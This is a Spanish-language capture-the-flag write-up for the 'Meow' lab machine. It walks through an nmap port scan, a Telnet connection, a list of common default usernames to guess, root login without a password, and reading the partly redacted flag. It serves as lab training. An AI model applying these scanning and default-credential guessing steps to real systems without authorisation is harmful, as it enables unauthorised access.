
## Escaneo de Puertos:

Comenzamos usando "**nmap**" para escanear los puertos abiertos a ver que nos encontramos.
```bash
[15:55:36] bapee@BlumeSec ~/Escritorio/meow ❯ sudo nmap -sVC -p- --open 10.129.10.165

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que hay un único puerto que es el 23/Telnet, por lo que vamos a conectarnos a ver que nos encontramos.

## Conexión a Telnet:

Para conectarnos al servicio Telnet lo haremos usando el comando "**Telnet (IP)**".
```bash
[15:56:26] bapee@BlumeSec ~/Escritorio/meow ❯ telnet 10.129.10.165

Trying 10.129.10.165...
Connected to 10.129.10.165.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

Meow login: 
```

Vemos un login, como de costumbre al no conocer credenciales necesitamos comprobar los usuarios mas típicos como por ejemplo:
```txt
user
admin
test
root
guest
toor
```

Después de probar varias veces vemos que con el usuario "**root**" podemos acceder sin necesidad de contraseña.
```bash
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
Last login: Mon May 25 13:56:59 UTC 2026 on pts/0
root@Meow:~# 
```

## Obtención de Flag:

Una vez dentro como **root** simplemente tenemos que listar los archivos del **directorio actual** y leer la **flag** usando **cat**.
```txt
root@Meow:~# pwd
/root
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe-------------ecba8a4c19
root@Meow:~# 
```

De esta manera la maquina **Meow** quedaría vulnerada!

## Resumen del Ataque

1. Se realiza un escaneo con **Nmap** para identificar servicios expuestos, detectando únicamente el puerto **23/Telnet** abierto.
2. Se accede al servicio **Telnet** y, tras probar credenciales comunes, se descubre que el usuario **root** no requiere contraseña.
3. Se obtiene acceso privilegiado directamente como **root** y se lee la flag ubicada en el directorio `/root`.
4. 